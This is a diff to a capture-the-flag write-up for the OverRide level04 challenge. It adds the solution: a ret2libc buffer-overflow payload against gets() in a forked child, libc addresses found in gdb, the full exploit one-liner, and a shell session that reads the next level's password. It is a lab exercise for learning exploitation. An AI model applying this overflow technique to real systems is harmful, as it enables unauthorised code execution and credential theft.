@@ -3,11 +3,8 @@
 0x080486c8  main
 ```
 ---
-
 ### 0x080486c8 : main() : disassembly
-
 - notebook: (to convert `hex` to `dec` and assign variable names for better reading)
-
 ```c
 {
 	// 0xb  ... 11
@@ -169,11 +166,8 @@ kill(fork_pid, 9);
 return(0);
 ```
 
-
 ### Code Prediction
-
 ```c
-
 int main(int argc(ebp + 8), char **argv(ebp+12)) {
 
 	pid_t fork_pid
@@ -216,53 +210,87 @@ int main(int argc(ebp + 8), char **argv(ebp+12)) {
 
 ```c
 +-------------------+
-[      **argv       ]
-+-------------------+ +12
-[        argc       ]
-+-------------------+ +8
-[ret addr (OLD_EIP) ]
-+-------------------+ +4
-[      OLD_EBP      ]
-+-------------------+ <--- EBP
-[                   ]
-+-------------------+ 
-[                   ]
-+-------------------+ 
-[                   ] 
-+-------------------+ ESP + 172 fork_pid
-[                   ]
-+-------------------+ ESP + 168 ptrace_ret
-[                   ]
-+-------------------+ ESP + 164 tmp2
-[                   ]
-+-------------------+ ESP + 160 tmp
-[                   ]
-+-------------------+
-[                   ]
-+-------------------+ ESP + 32  buff1 (128 bytes)
-[                   ]
-+-------------------+ ESP + 28  status
-[                   ]
-+-------------------+
-[                   ]
-+-------------------+ ESP
+|      **argv       |
+|-------------------| +12
+|        argc       |
+|-------------------| +8
+|ret addr (OLD_EIP) |
+|-------------------| +4
+|      OLD_EBP      |
+|-------------------| <--- EBP (ESP+176)
+|                   | 
+|-------------------| ESP + 172 fork_pid
+|                   |
+|-------------------| ESP + 168 ptrace_ret
+|                   |
+|-------------------| ESP + 164 tmp2
+|                   |
+|-------------------| ESP + 160 tmp
+|                   |
+|-------------------|
+|                   |
+|-------------------| ESP + 32  buff1 (128 bytes)
+|                   |
+|-------------------| ESP + 28  status
+|                   |
+|-------------------|
+|                   |
++-------------------+ <--- ESP
 
 ```
 
 ### Process of the Exploit
-- NOT KNOWN YET
+- the code fork a chill process
+- there is a `gets(buffer)` in the child process
+- we can exploit a buffer overflow with that gets
 ---
 
 ### Solution :
-```
-NOT FOUND YET
-```
 
-|**`flag : ...`**
+- Payload : **`(A * 156 + system + exit + "/bin/sh/")`**
+	- find the address of system
+		```
+		(gdb) p system
+		$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+		```
+		**0xf7e6aed0**
+	- find the address of exit
+		```
+		(gdb) p exit
+		$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+		(gdb)
+		```
+		**0xf7e5eb70**
+	- find the address of "/bin/sh"
+		```
+		(gdb) find system, +9999999, "/bin/sh"
+		0xf7f897ec
+		warning: Unable to access target memory at 0xf7fd3b74, halting search.
+		1 pattern found.
+		(gdb) x/s 0xf7f897ec
+		0xf7f897ec:	 "/bin/sh"
+		(gdb)
+		```
+		**0xf7f897ec**
+- **`(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" '; cat -) | ./level04`**
+- 
+	```shell
+	level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" '; cat -) | ./level04
+	Give me some shellcode, k
+	pwd
+	/home/users/level04
+	whoami
+	level05
+	cat /home/users/level05/.pass
+	3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+	```
+|**`flag : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`**
 ---
 
 ### Ressources :
-N/A
-<!-- **_[doc1](link)_**
-**_[doc2](link)_** -->
- 
+**_["fork" function in c](https://man7.org/linux/man-pages/man2/fork.2.html)_**
+**_["prctl" function in c](https://man7.org/linux/man-pages/man2/prctl.2.html)_**
+**_["ptrace" function in c](https://man7.org/linux/man-pages/man2/ptrace.2.html)_**
+**_["ptrace" function in c](https://man7.org/linux/man-pages/man2/ptrace.2.html)_**
+**_["sar" instruction in assembley](http://www.c-jump.com/CIS77/ASM/Flags/F77_0160_sar_instruction.htm)_**
+
